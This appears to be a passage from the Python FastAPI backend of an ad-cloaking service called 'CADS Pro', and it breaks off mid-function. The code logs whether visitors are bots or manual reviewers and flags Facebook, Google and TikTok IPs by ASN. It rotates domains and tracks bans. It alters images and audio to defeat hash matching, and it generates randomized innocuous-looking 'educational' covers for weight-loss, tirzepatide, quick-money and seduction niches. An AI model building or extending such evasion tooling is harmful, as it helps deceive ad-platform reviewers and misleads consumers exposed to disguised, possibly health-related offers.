import os
import io
import time
import hashlib
import random
import re
import json
import sqlite3
import tempfile
import secrets
import logging
import shutil
from pathlib import Path
from starlette.concurrency import run_in_threadpool
from contextlib import closing
import urllib.request
import urllib.parse
from datetime import datetime, timedelta
from urllib.parse import quote
from fastapi import FastAPI, UploadFile, File, Form, HTTPException, Request, Header
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse, Response
from PIL import Image, ImageEnhance, ImageDraw, ImageFont, ImageOps, UnidentifiedImageError
from server.security import RequestGuardMiddleware, SecurityHeadersMiddleware
from server import accounts
from server import media_cloak

app = FastAPI(title="Camouflage Ads API - CADS Pro", version="3.0.0-ENTERPRISE")

# === SISTEMA DE AUTENTICAÇÃO POR API KEY (SQLite) ===
CADS_DATA_DIR = os.environ.get("CADS_DATA_DIR") or None
DB_PATH = os.path.join(CADS_DATA_DIR or os.path.dirname(os.path.abspath(__file__)), "cads_auth.db")
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
PLAN_LIMIT_DEFAULT = int(os.environ.get("PLAN_LIMIT_DEFAULT", "5000"))
if PLAN_LIMIT_DEFAULT < 1:
    raise ValueError("PLAN_LIMIT_DEFAULT deve ser um inteiro positivo.")


CUSTOMER_STATS = {}


def database_path():
    return accounts.customer_database(DB_PATH)


def processed_directory():
    return accounts.customer_processed(PROCESSED_DIR)


def data_directory(default):
    return str(accounts.customer_directory(default))


def stats_state():
    customer = accounts.CURRENT_CUSTOMER.get()
    if not customer or customer['role'] == 'admin':
        return STATS
    return CUSTOMER_STATS.setdefault(customer['id'], {
        'processed_today': 0, 'protected_files': 0, 'plan_used': 0,
        'audio_cloaked_today': 0, 'video_cloaked_today': 0,
        'plan_limit': PLAN_LIMIT_DEFAULT, 'recent_activities': [],
    })


def init_db():
    conn = sqlite3.connect(database_path())
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS hidden_activities (filename TEXT PRIMARY KEY)')
    c.execute('''CREATE TABLE IF NOT EXISTS api_keys (
        key TEXT PRIMARY KEY,
        plan TEXT DEFAULT 'free',
        requests_today INTEGER DEFAULT 0,
        requests_month INTEGER DEFAULT 0,
        created_at TEXT,
        last_used TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS cloaker_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        ip TEXT,
        user_agent TEXT,
        is_bot INTEGER,
        is_manual_reviewer INTEGER,
        referrer TEXT,
        destination TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS domain_rotator (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        domain TEXT,
        status TEXT DEFAULT 'active',
        last_checked TEXT,
        ban_detected INTEGER DEFAULT 0
    )''')
    conn.commit()
    conn.close()

init_db()
accounts.initialize()

def check_api_key(api_key: str = None):
    if not api_key:
        return {"allowed": True, "plan": "free", "remaining": 999}
    conn = sqlite3.connect(database_path())
    c = conn.cursor()
    c.execute("SELECT plan, requests_today, requests_month FROM api_keys WHERE key = ?", (api_key,))
    row = c.fetchone()
    if not row:
        conn.close()
        return {"allowed": False, "error": "API Key inválida"}
    plan, req_today, req_month = row
    limits = {"free": 10, "pro": 100, "enterprise": 99999}
    limit = limits.get(plan, 10)
    if req_today >= limit:
        conn.close()
        return {"allowed": False, "error": f"Limite diário atingido ({limit} req/dia)"}
    c.execute("UPDATE api_keys SET requests_today = requests_today + 1, requests_month = requests_month + 1, last_used = ? WHERE key = ?",
              (datetime.now().isoformat(), api_key))
    conn.commit()
    conn.close()
    return {"allowed": True, "plan": plan, "remaining": limit - req_today - 1}

# === CACHE ASN EM TEMPO REAL ===
ASN_CACHE = {}
ASN_CACHE_TTL = 86400  # 24 horas

def check_asn_realtime(ip: str):
    """Consulta ASN do IP via ipinfo.io (grátis até 50k/mês)"""
    if ip in ASN_CACHE:
        cached_time, cached_data = ASN_CACHE[ip]
        if time.time() - cached_time < ASN_CACHE_TTL:
            return cached_data
    try:
        url = f"http://ipinfo.io/{ip}/json"
        req = urllib.request.Request(url, headers={'User-Agent': 'CADS-Pro/3.0'})
        with urllib.request.urlopen(req, timeout=3) as resp:
            data = json.loads(resp.read().decode())
            org = data.get('org', '')
            asn_info = {
                "asn": org.split()[0] if org else "",
                "org": org,
                "is_facebook": "AS32934" in org or "Facebook" in org,
                "is_google": "AS15169" in org or "Google" in org,
                "is_tiktok": "ByteDance" in org or "TikTok" in org
            }
            ASN_CACHE[ip] = (time.time(), asn_info)
            return asn_info
    except:
        return {"asn": "", "org": "", "is_facebook": False, "is_google": False, "is_tiktok": False}

app.add_middleware(RequestGuardMiddleware)
app.add_middleware(accounts.CustomerAccessMiddleware, initialize_data=init_db,
                   data_database=database_path, data_processed=processed_directory)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(BASE_DIR)
PUBLIC_DIR = os.path.join(PROJECT_DIR, "public")
PROCESSED_DIR = os.path.join(CADS_DATA_DIR or PROJECT_DIR, "processed")
os.makedirs(PROCESSED_DIR, exist_ok=True)
os.makedirs(PUBLIC_DIR, exist_ok=True)

STATS = {
    "audio_cloaked_today": 0,
    "video_cloaked_today": 0,
    "processed_today": 0,
    "protected_files": 0,
    "plan_used": 0,
    "plan_limit": PLAN_LIMIT_DEFAULT,
    "recent_activities": []
}

def push_activity(name, type_, tag, icon, filename=None):
    item = {
        "name": name,
        "type": type_,
        "tag": tag,
        "time": "Agora mesmo",
        "icon": icon,
    }
    if filename:
        item["filename"] = filename
        item["download_url"] = f"/api/download/{quote(filename)}"
    stats_state()["recent_activities"].insert(0, item)
    if len(stats_state()["recent_activities"]) > 10:
        stats_state()["recent_activities"].pop()


def list_processed_activities(limit=10, excluded=()):
    if not os.path.isdir(processed_directory()):
        return []
    files = []
    for name in os.listdir(processed_directory()):
        if name in excluded or name.startswith("_tmp_") or name.startswith("_test_"):
            continue
        path = os.path.join(processed_directory(), name)
        if os.path.isfile(path):
            files.append((os.path.getmtime(path), name))
    files.sort(reverse=True)
    items = []
    for mtime, name in files[:limit]:
        lower = name.lower()
        if lower.endswith((".mp4", ".mov", ".webm", ".avi", ".mkv")):
            kind, tag, icon = "video", "Vídeo pronto · clique para baixar", "video"
        elif lower.endswith((".jpg", ".jpeg", ".png", ".webp")):
            kind, tag, icon = "imagem", "Imagem pronta · clique para baixar", "image"
        elif lower.endswith(".html"):
            kind, tag, icon = "clone", "Página clonada · clique para baixar", "copy"
        else:
            kind, tag, icon = "file", "Arquivo pronto · clique para baixar", "file"
        items.append({
            "name": name,
            "type": kind,
            "tag": tag,
            "time": time.strftime("%H:%M", time.localtime(mtime)),
            "icon": icon,
            "filename": name,
            "download_url": f"/api/download/{quote(name)}",
        })
    return items


@app.get("/api/stats")
def get_stats():
    data = dict(stats_state())
    saved = list_processed_activities(limit=None)
    dates = [datetime.fromtimestamp(os.path.getmtime(os.path.join(processed_directory(), a["filename"])))
             for a in saved]
    now = datetime.now()
    data.update(processed_today=sum(d.date() == now.date() for d in dates),
                protected_files=len(saved),
                plan_used=sum((d.year, d.month) == (now.year, now.month) for d in dates))
    for kind in ("audio", "video"):
        data[f"{kind}_cloaked_today"] = sum(
            date.date() == now.date() and item["filename"].startswith(f"cads_cloak_{kind}_")
            for date, item in zip(dates, saved))
    with closing(sqlite3.connect(database_path())) as conn:
        hidden = {row[0] for row in conn.execute('SELECT filename FROM hidden_activities')}
    mem = [a for a in (stats_state().get("recent_activities") or [])
           if a.get("filename") not in hidden and a.get("filename")
           and os.path.isfile(os.path.join(processed_directory(), a["filename"]))]
    disk = list_processed_activities(12, excluded=hidden)
    seen = {a.get("filename") for a in mem if a.get("filename")}
    merged = list(mem)
    for item in disk:
        if item["filename"] not in seen:
            merged.append(item)
            seen.add(item["filename"])
        if len(merged) >= 12:
            break
    data["recent_activities"] = merged[:12] if merged else disk
    for field, default in (("processed_today", 0), ("protected_files", 0),
                           ("plan_used", 0), ("plan_limit", PLAN_LIMIT_DEFAULT)):
        if data.get(field) is None:
            data[field] = default
    return data

@app.post("/api/camouflage/image")
async def camouflage_image(
    file: UploadFile = File(...),
    level: str = Form("normal") # basica, normal, agressiva
):
    if level not in {"basica", "normal", "agressiva"}:
        raise HTTPException(400, "Nivel de imagem invalido.")
    try:
        content = await file.read(20 * 1024 * 1024 + 1)
        if len(content) > 20 * 1024 * 1024:
            raise HTTPException(413, "A imagem deve ter no maximo 20 MB.")
        img = Image.open(io.BytesIO(content))
        if img.format not in {"JPEG", "PNG", "WEBP"} or img.width * img.height > 25_000_000:
            raise HTTPException(400, "Use JPG, PNG ou WEBP de ate 25 megapixels.")
        img = ImageOps.exif_transpose(img)
        
        # Strip EXIF
        clean_img = Image.new("RGB", img.size)
        if img.mode in ("RGBA", "P"):
            clean_img.paste(img.convert("RGB"))
        else:
            clean_img.paste(img)
            
        w, h = clean_img.size
        
        # Ajustes baseados no nível selecionado (Estilo CamuflaAds)
        if level == "basica":
            if w > 10 and h > 10:
                clean_img = clean_img.crop((1, 1, w - 1, h - 1))
            quality = 98
            salt_size = 16
        elif level == "normal":
            if w > 10 and h > 10:
                clean_img = clean_img.crop((2, 2, w - 2, h - 2))
            enhancer = ImageEnhance.Brightness(clean_img)
            clean_img = enhancer.enhance(1.0 + random.uniform(0.003, 0.008))
            quality = 96
            salt_size = 64
        else: # agressiva
            if w > 10 and h > 10:
                clean_img = clean_img.crop((3, 3, w - 3, h - 3))
            enhancer_b = ImageEnhance.Brightness(clean_img)
            clean_img = enhancer_b.enhance(1.0 + random.uniform(0.006, 0.012))
            enhancer_c = ImageEnhance.Contrast(clean_img)
            clean_img = enhancer_c.enhance(1.0 + random.uniform(0.004, 0.009))
            quality = 94
            salt_size = 128
            
        out_filename = f"cads_{level}_{secrets.token_hex(8)}.jpg"
        out_path = os.path.join(processed_directory(), out_filename)
        
        clean_img.save(out_path, format="JPEG", quality=quality, optimize=True)
        
        # Adicionar padding binário pra quebrar hash
        with open(out_path, "ab") as f:
            f.write(os.urandom(salt_size))
            
        stats_state()["processed_today"] += 1
        stats_state()["protected_files"] += 1
        stats_state()["plan_used"] += 1
        push_activity(file.filename, "imagem", f"Camuflado · {level.capitalize()}", "image", out_filename)
            
        with open(out_path, "rb") as f:
            new_hash = hashlib.md5(f.read()).hexdigest()
            
        return {
            "status": "success",
            "filename": out_filename,
            "download_url": f"/api/download/{out_filename}",
            "level": level,
            "new_hash": new_hash
        }
    except HTTPException:
        raise
    except (UnidentifiedImageError, Image.DecompressionBombError):
        raise HTTPException(400, "Imagem invalida.") from None
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

async def _save_cloak_upload(upload, path, limit):
    size = 0
    with open(path, "wb") as handle:
        while chunk := await upload.read(1024 * 1024):
            size += len(chunk)
            if size > limit:
                raise HTTPException(413, f"O arquivo deve ter no maximo {limit // (1024 * 1024)} MB.")
            handle.write(chunk)
    if not size:
        raise HTTPException(400, "Arquivo vazio.")


@app.post("/api/camouflage/audio")
async def camouflage_audio(file: UploadFile = File(...), level: str = Form("normal")):
    if level not in media_cloak.LEVELS:
        raise HTTPException(400, "Nivel de camuflagem invalido.")
    suffix = Path(file.filename or "").suffix.lower()
    if suffix not in {".mp3", ".wav", ".aac", ".ogg"}:
        raise HTTPException(400, "Formato de midia invalido.")
    filename = f"cads_cloak_audio_{level}_{secrets.token_hex(8)}.m4a"
    output = Path(processed_directory()) / filename
    success = False
    try:
        with tempfile.TemporaryDirectory(prefix="_tmp_cloak_") as folder:
            source = Path(folder) / ("input" + suffix)
            await _save_cloak_upload(file, source, 50 * 1024 * 1024)
            await run_in_threadpool(media_cloak.cloak_audio, source, output, level)
        digest = hashlib.sha256()
        with open(output, "rb") as handle:
            while chunk := handle.read(1024 * 1024):
                digest.update(chunk)
        state = stats_state()
        for key in ("processed_today", "protected_files", "plan_used", "audio_cloaked_today"):
            state[key] = (state.get(key) or 0) + 1
        push_activity(file.filename, "audio", f"Camuflado · {level.capitalize()}", "music", filename)
        success = True
        return {"status": "success", "filename": filename,
                "download_url": f"/api/download/{filename}", "new_hash": digest.hexdigest(), "level": level}
    except subprocess.TimeoutExpired:
        raise HTTPException(504, "O processamento excedeu 300 segundos.") from None
    except media_cloak.InvalidMedia:
        raise HTTPException(400, "Arquivo de midia invalido ou nao suportado.") from None
    except HTTPException:
        raise
    except Exception:
        logging.getLogger(__name__).exception("Erro na camuflagem de audio")
        raise HTTPException(500, "Nao foi possivel processar a midia.") from None
    finally:
        if not success:
            output.unlink(missing_ok=True)
        await file.close()


import subprocess
import imageio_ffmpeg


def run_ffmpeg(cmd, timeout):
    return subprocess.run(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        timeout=timeout,
    )


def probe_media(ffmpeg_exe, path):
    duration = 10.0
    has_audio = False
    try:
        res = subprocess.run(
            [ffmpeg_exe, "-i", path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True,
            timeout=20,
        )
        err = res.stderr or ""
        has_audio = "Audio:" in err
        for line in err.splitlines():
            if "Duration:" in line:
                d_str = line.split("Duration:")[1].split(",")[0].strip()
                parts = d_str.split(":")
                duration = float(parts[0]) * 3600 + float(parts[1]) * 60 + float(parts[2])
                break
    except Exception:
        pass
    return duration, has_audio


def apply_timeline_padding(ffmpeg_exe, raw_video_path, cover_path, out_path, pad_time, intro_seconds=4):
    """Cover first, then the source, then optional end padding — concat-copy."""
    ts = int(time.time() * 1000)
    orig_norm = os.path.join(processed_directory(), f"_tmp_orig_{ts}.mp4")
    still_chunk = os.path.join(processed_directory(), f"_tmp_still_{ts}.mp4")
    concat_list = os.path.join(processed_directory(), f"_tmp_concat_{ts}.txt")
    temps = [orig_norm, still_chunk, concat_list]
    chunk_secs = 2
    intro_loops = max(1, int(max(2, intro_seconds) // chunk_secs))
    loops = max(0, int(max(0, pad_time) // chunk_secs))
    vf = (
        "scale=720:1280:force_original_aspect_ratio=decrease,"
        "pad=720:1280:(ow-iw)/2:(oh-ih)/2,setsar=1,fps=30"
    )
    vcodec = ["-c:v", "libx264", "-preset", "ultrafast", "-crf", "26", "-pix_fmt", "yuv420p"]
    acodec = ["-c:a", "aac", "-b:a", "64k", "-ar", "44100", "-ac", "2"]

    try:
        _, has_audio = probe_media(ffmpeg_exe, raw_video_path)
        if has_audio:
            orig_cmd = [
                ffmpeg_exe, "-y", "-i", raw_video_path,
                "-vf", vf,
                "-af", "aformat=sample_fmts=fltp:sample_rates=44100:channel_layouts=stereo",
                *vcodec, *acodec, orig_norm,
            ]
        else:
            orig_cmd = [
                ffmpeg_exe, "-y", "-i", raw_video_path,
                "-f", "lavfi", "-t", "36000", "-i", "anullsrc=r=44100:cl=stereo",
                "-vf", vf, *vcodec, *acodec, "-shortest", orig_norm,
            ]

        still_cmd = [
            ffmpeg_exe, "-y",
            "-loop", "1", "-framerate", "1", "-t", str(chunk_secs), "-i", cover_path,
            "-f", "lavfi", "-t", str(chunk_secs), "-i", "anullsrc=r=44100:cl=stereo",
            "-vf", vf, *vcodec, "-tune", "stillimage", *acodec, still_chunk,
        ]

        orig_timeout = 240
        orig_res = run_ffmpeg(orig_cmd, timeout=orig_timeout)
        if orig_res.returncode != 0 or not os.path.exists(orig_norm):
            raise RuntimeError((orig_res.stderr or b"").decode("utf-8", "ignore")[-800:])

        still_res = run_ffmpeg(still_cmd, timeout=60)
        if still_res.returncode != 0 or not os.path.exists(still_chunk):
            raise RuntimeError((still_res.stderr or b"").decode("utf-8", "ignore")[-800:])

        def ff_path(path):
            return path.replace("\\", "/")

        with open(concat_list, "w", encoding="utf-8") as handle:
            for _ in range(intro_loops):
                handle.write(f"file '{ff_path(still_chunk)}'\n")
            handle.write(f"file '{ff_path(orig_norm)}'\n")
            for _ in range(loops):
                handle.write(f"file '{ff_path(still_chunk)}'\n")

        concat_res = run_ffmpeg(
            [ffmpeg_exe, "-y", "-f", "concat", "-safe", "0", "-i", concat_list, "-c", "copy", out_path],
            timeout=90,
        )
        if concat_res.returncode != 0 or not os.path.exists(out_path) or os.path.getsize(out_path) == 0:
            raise RuntimeError((concat_res.stderr or b"").decode("utf-8", "ignore")[-800:])
        return True
    finally:
        for temp in temps:
            if os.path.exists(temp):
                try:
                    os.remove(temp)
                except Exception:
                    pass

def get_font(size: int, bold: bool = True):
    font_paths = [
        "C:/Windows/Fonts/arialbd.ttf" if bold else "C:/Windows/Fonts/arial.ttf",
        "C:/Windows/Fonts/seguiemj.ttf",
        "C:/Windows/Fonts/tahomabd.ttf" if bold else "C:/Windows/Fonts/tahoma.ttf",
        "C:/Windows/Fonts/verdana.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
    ]
    for p in font_paths:
        if os.path.exists(p):
            try:
                return ImageFont.truetype(p, size)
            except Exception:
                pass
    return ImageFont.load_default(size=size)

def _jitter_color(color, spread=18):
    return tuple(max(0, min(255, c + random.randint(-spread, spread))) for c in color)


def _cover_text_color(background):
    channels = [value / 255 for value in background]
    luminance = sum((value / 12.92 if value <= 0.04045 else ((value + 0.055) / 1.055) ** 2.4) * weight
                    for value, weight in zip(channels, (0.2126, 0.7152, 0.0722)))
    return (0, 0, 0) if luminance > 0.179 else (255, 255, 255)


def _centered_text(draw, text, y, font, fill, canvas_w=1080):
    bb = draw.textbbox((0, 0), text, font=font)
    draw.text(((canvas_w - (bb[2] - bb[0])) // 2, y), text, font=font, fill=fill)


def _wrapped_center(draw, text, y, font, fill, max_width, canvas_w=1080, line_h=54):
    words = text.split()
    lines, cur = [], ""
    for word in words:
        test = (cur + " " + word).strip()
        bb = draw.textbbox((0, 0), test, font=font)
        if (bb[2] - bb[0]) <= max_width or not cur:
            cur = test
        else:
            lines.append(cur)
            cur = word
    if cur:
        lines.append(cur)
    for i, line in enumerate(lines[:3]):
        _centered_text(draw, line, y + i * line_h, font, fill, canvas_w)
    return y + min(len(lines), 3) * line_h


def _niche_copy_bank(niche_clean: str, niche_label: str):
    if any(k in niche_clean for k in ["emagrec", "peso", "dieta", "tirz", "pept", "gordur", "barrig", "saude", "med"]):
        palettes = [
            ((7, 28, 24), (3, 12, 14), (16, 185, 129), (52, 211, 153)),
            ((12, 22, 38), (4, 8, 16), (45, 212, 191), (94, 234, 212)),
            ((20, 18, 8), (8, 6, 3), (234, 179, 8), (253, 224, 71)),
            ((10, 24, 20), (2, 8, 10), (74, 222, 128), (187, 247, 208)),
        ]
        return palettes, {
            "badges": ["BEM-ESTAR & ROTINA", "VIDA SAUDÁVEL", "CUIDADO PESSOAL", "EQUILÍBRIO DIÁRIO", "HÁBITOS POSITIVOS"],
            "tags": ["CONTEÚDO EDUCATIVO", "SÉRIE INFORMATIVA", "DICAS PRÁTICAS", "MATERIAL GRATUITO", "APRENDA MAIS"],
            "h1": ["CUIDE DE VOCÊ", "PEQUENAS MUDANÇAS", "ROTINA SAUDÁVEL", "BEM-ESTAR DIÁRIO", "VIDA EM EQUILÍBRIO"],
            "h2": ["COMECE PELO BÁSICO", "UM PASSO DE CADA VEZ", "SEM PRESSA", "CONSISTÊNCIA IMPORTA", "INFORMAÇÃO CONFIÁVEL"],
            "subs": [
                "Conteúdo educativo sobre hábitos saudáveis e bem-estar",
                "Informações gerais para quem busca qualidade de vida",
                "Material informativo sem promessas ou garantias",
            ],
            "ctas": ["SAIBA MAIS", "VER CONTEÚDO", "APRENDER MAIS", "CONTINUAR LENDO"],
        }
    if any(k in niche_clean for k in ["renda", "dinheiro", "mkt", "afiliad", "venda", "trafego", "digital", "drop", "crypto"]):
        palettes = [
            ((28, 14, 52), (10, 6, 20), (168, 85, 247), (236, 72, 153)),
            ((8, 20, 36), (3, 8, 16), (56, 189, 248), (125, 211, 252)),
            ((30, 20, 8), (10, 6, 2), (251, 146, 60), (253, 186, 116)),
        ]
        return palettes, {
            "badges": ["NEGÓCIOS DIGITAIS", "ESTRATÉGIA & OFERTA", "FUNIL NA PRÁTICA", "OPERAÇÃO ENXUTA"],
            "tags": ["AULA ABERTA 2026", "MODELO EM 3 ETAPAS", "BASTIDORES REAIS", "CHECKLIST GRÁTIS"],
            "h1": ["A ESTRUTURA PRONTA", "O FUNIL QUE SEGURA", "PARE DE IMPROVISAR", "O MAPA DAS VENDAS"],
            "h2": ["RODA SEM VOCÊ NA CÂMERA", "COMEÇA COM 1 OFERTA", "DO ZERO AO PRIMEIRO PIX", "SEM EQUIPE GIGANTE"],
            "subs": [
                "Um recorte direto de como montar oferta, página e tráfego",
                "Veja o fluxo completo sem enrolação de guru",
                "Material objetivo para quem já vende ou quer começar",
            ],
            "ctas": ["VER A ESTRUTURA", "ABRIR A AULA", "TOQUE PARA VER", "CONTINUAR AGORA"],
        }
    if any(k in niche_clean for k in ["relaciona", "conquist", "seduc", "homem", "mulher", "amor", "casal"]):
        palettes = [
            ((48, 12, 26), (15, 5, 9), (244, 63, 94), (251, 113, 133)),
            ((24, 10, 32), (8, 4, 14), (192, 132, 252), (232, 121, 249)),
            ((36, 16, 16), (12, 6, 6), (251, 113, 133), (254, 205, 211)),
        ]
        return palettes, {
            "badges": ["COMUNICAÇÃO AFETIVA", "PSICOLOGIA DO CASAL", "RELACIONAMENTO REAL", "CONVERSA QUE CONECTA"],
            "tags": ["GUIA RÁPIDO", "3 FRASES NA PRÁTICA", "SÉRIE SOBRE CONEXÃO", "AULA CURTA"],
            "h1": ["A CONVERSA QUE MUDA", "O ERRO MAIS COMUM", "3 FRASES QUE ABREM", "PARE DE INSISTIR MAL"],
            "h2": ["SEM PRESSÃO BARATA", "COMEÇA PELA ESCUTA", "VOLTA O INTERESSE", "FUNCIONA NO DIA A DIA"],
            "subs": [
                "Conteúdo sobre comunicação, respeito e conexão real",
                "Um recorte curto para aplicar na próxima conversa",
                "Sem fórmula mágica: só clareza e postura",
            ],
            "ctas": ["ASSISTIR AGORA", "VER AS 3 FRASES", "ABRIR O GUIA", "TOQUE PARA VER"],
        }
    if any(k in niche_clean for k in ["estetica", "pele", "cabel", "ruga", "beleza", "facial", "rejuvenesc"]):
        palettes = [
            ((38, 18, 32), (14, 6, 14), (244, 114, 182), (253, 164, 175)),
            ((20, 16, 28), (8, 6, 12), (196, 181, 253), (233, 213, 255)),
            ((28, 20, 16), (10, 8, 6), (251, 191, 36), (253, 230, 138)),
        ]
        return palettes, {
            "badges": ["CUIDADO COM A PELE", "ROTINA FACIAL", "ESTÉTICA CONSCIENTE", "GUIA DE HÁBITOS"],
            "tags": ["ROTINA DE 7 DIAS", "PASSO A PASSO CASEIRO", "CHECKLIST NOTURNO", "SÉRIE PRÁTICA"],
            "h1": ["A ROTINA DA NOITE", "O PASSO QUE FALTA", "PELE MAIS FIRME", "MENOS PRODUTO, MAIS MÉTODO"],
            "h2": ["COMEÇA EM 5 MINUTOS", "SEM PROMESSA MILAGROSA", "HÁBITO QUE APARECE", "PARA PELE CANSADA"],
            "subs": [
                "Um guia curto de rotina, consistência e cuidados diários",
                "Veja a ordem certa sem encher a pia de produto",
                "Conteúdo educativo sobre hábitos de pele",
            ],
            "ctas": ["VER A ROTINA", "ABRIR O GUIA", "ASSISTIR O PASSO", "TOQUE PARA VER"],
        }
    palettes = [
        ((15, 23, 42), (7, 10, 19), (59, 130, 246), (96, 165, 250)),
        ((18, 16, 12), (6, 5, 4), (251, 191, 36), (253, 224, 71)),
        ((16, 24, 20), (5, 8, 7), (52, 211, 153), (167, 243, 208)),
    ]
    label = (niche_label or "EXCLUSIVO").upper()[:28]
    return palettes, {
        "badges": [f"SÉRIE: {label}", "CONTEÚDO OBJETIVO", "RESUMO PRÁTICO", "AULA ABERTA"],
        "tags": ["ATUALIZAÇÃO 2026", "GUIA EM 3 MINUTOS", "PASSO A PASSO", "MATERIAL DIRETO"],
        "h1": ["O PONTO QUE NINGUÉM MOSTRA", "O RESUMO SEM ENROLAÇÃO", "3 IDEIAS QUE SEGURAM", "O QUE FAZER AGORA"],
        "h2": ["SEM PROMESSA VAZIA", "COMEÇA PELO BÁSICO", "APLICA HOJE", "CLAREZA EM POUCOS MINUTOS"],
        "subs": [
            "Um recorte direto para entender o assunto sem enrolação",
            "Assista o resumo e decida o próximo passo com calma",
            "Conteúdo curto, visual e fácil de acompanhar",
        ],
        "ctas": ["ASSISTIR O RESUMO", "ABRIR O CONTEÚDO", "TOQUE PARA VER", "CONTINUAR"],
    }


def create_niche_cover_image(niche: str, custom_text: str = "") -> Image.Image:
    """Gera uma capa 1080x1920 única a cada chamada: copy, cor e layout sorteados."""
    w, h = 1080, 1920
    niche_clean = niche.strip().lower() if niche else "geral"
    palettes, bank = _niche_copy_bank(niche_clean, niche)
    bg_top, bg_bot, accent, accent_light = random.choice(palettes)
    bg_top, bg_bot = _jitter_color(bg_top, 10), _jitter_color(bg_bot, 8)
    accent, accent_light = _jitter_color(accent, 16), _jitter_color(accent_light, 16)
    card_fill = _jitter_color((12, 18, 28), 12)

    cat_badge = random.choice(bank["badges"])
    tag_text = random.choice(bank["tags"])
    headline_1 = random.choice(bank["h1"])
    headline_2 = custom_text.upper()[:45] if custom_text else random.choice(bank["h2"])
    sub_text = random.choice(bank["subs"])
    btn_label = random.choice(bank["ctas"])
    layout = random.choice(["play", "number", "quote", "bar"])
    seed_mark = f"v{random.randint(11, 99)}.{random.randint(10, 99)}"

    font_badge = get_font(random.choice([34, 36, 38]), bold=True)
    font_tag = get_font(34, bold=True)
    font_h1 = get_font(random.choice([72, 76, 80]), bold=True)
    font_h2 = get_font(random.choice([54, 58, 62]), bold=True)
    font_sub = get_font(38, bold=False)
    font_btn = get_font(42, bold=True)
    font_mark = get_font(18, bold=False)

    img = Image.new("RGB", (w, h), color=bg_bot)
    draw = ImageDraw.Draw(img)
    reverse = random.random() < 0.35
    c0, c1 = (bg_bot, bg_top) if reverse else (bg_top, bg_bot)
    for y in range(h):
        t = y / h
        fill = (
            int(c0[0] + (c1[0] - c0[0]) * t),
            int(c0[1] + (c1[1] - c0[1]) * t),
            int(c0[2] + (c1[2] - c0[2]) * t),
        )
        draw.line([(0, y), (w, y)], fill=fill)

    for _ in range(random.randint(2, 4)):
        cx, cy = random.randint(-80, w + 80), random.randint(-80, h + 80)
        rr = random.randint(90, 260)
        orb = _jitter_color(accent, 40)
        draw.ellipse([cx - rr, cy - rr, cx + rr, cy + rr], outline=orb, width=2)
        draw.ellipse([cx - rr // 2, cy - rr // 2, cx + rr // 2, cy + rr // 2], outline=_jitter_color(accent_light, 30), width=1)

    inset = random.randint(40, 80)
    top_m = random.randint(180, 240)
    bot_m = random.randint(180, 240)
    card = [inset, top_m, w - inset, h - bot_m]
    radius = random.choice([28, 36, 44, 52])
    draw.rounded_rectangle(card, radius=radius, fill=card_fill, outline=(255, 255, 255), width=random.choice([1, 2]))
    draw.rounded_rectangle([card[0] + 6, card[1] + 6, card[2] - 6, card[3] - 6], radius=max(16, radius - 8), outline=accent, width=2)

    badge_w = random.randint(580, 720)
    badge_h = random.randint(58, 74)
    bx1 = (w - badge_w) // 2
    by1 = card[1] + random.randint(48, 80)
    badge_fill = (255, 255, 255) if random.random() < 0.7 else accent
    badge_ink = _cover_text_color(badge_fill)
    while draw.textlength(cat_badge, font=font_badge) > badge_w - 48:
        font_badge = get_font(font_badge.size - 1, bold=True)
    draw.rounded_rectangle([bx1, by1, bx1 + badge_w, by1 + badge_h], radius=badge_h // 2, fill=badge_fill, outline=accent_light, width=2)
    _centered_text(draw, cat_badge, by1 + 16, font_badge, badge_ink, w)
    _centered_text(draw, f"✓ {tag_text}", by1 + badge_h + 18, font_tag, accent_light, w)

    mark_y = card[1] + 360
    if layout == "play":
        pr = random.randint(88, 120)
        draw.ellipse([w // 2 - pr, mark_y - pr, w // 2 + pr, mark_y + pr], fill=accent, outline=(255, 255, 255), width=5)
        draw.polygon([(w // 2 - 22, mark_y - 40), (w // 2 + 48, mark_y), (w // 2 - 22, mark_y + 40)], fill=(255, 255, 255))
    elif layout == "number":
        num = random.choice(["01", "02", "03", "07", "21"])
        nf = get_font(120, bold=True)
        _centered_text(draw, num, mark_y - 70, nf, accent, w)
    elif layout == "quote":
        qf = get_font(140, bold=True)
        _centered_text(draw, "“ ”", mark_y - 90, qf, accent, w)
    else:
        bar_w = random.randint(180, 280)
        draw.rounded_rectangle([w // 2 - bar_w // 2, mark_y - 8, w // 2 + bar_w // 2, mark_y + 8], radius=8, fill=accent)
        draw.ellipse([w // 2 - 18, mark_y - 18, w // 2 + 18, mark_y + 18], fill=(255, 255, 255), outline=accent, width=3)

    text_y = mark_y + 150
    text_y = _wrapped_center(draw, headline_1, text_y, font_h1, (255, 255, 255), 880, w, 94)
    text_y = _wrapped_center(draw, headline_2, text_y + 8, font_h2, accent_light, 900, w, 74)
    _wrapped_center(draw, sub_text, text_y + 16, font_sub, (210, 220, 235), 860, w, 50)

    btn_w, btn_h = random.randint(680, 800), random.randint(84, 100)
    btn_x = (w - btn_w) // 2
    btn_y = card[3] - random.randint(120, 160)
    btn_fill = (255, 255, 255) if random.random() < 0.6 else accent
    btn_ink = _cover_text_color(btn_fill)
    draw.rounded_rectangle([btn_x, btn_y, btn_x + btn_w, btn_y + btn_h], radius=random.choice([20, 26, 32]), fill=btn_fill)
    _centered_text(draw, btn_label, btn_y + 28, font_btn, btn_ink, w)
    _centered_text(draw, seed_mark, card[3] - 36, font_mark, (120, 130, 145), w)

    return img

@app.post("/api/cover/generate-preview")
async def generate_cover_preview(
    niche: str = Form("emagrecimento"),
    custom_text: str = Form("")
):
    try:
        img = create_niche_cover_image(niche, custom_text)
        out_filename = f"cads_cover_{int(time.time())}_{random.randint(1000,9999)}.jpg"
        out_path = os.path.join(processed_directory(), out_filename)
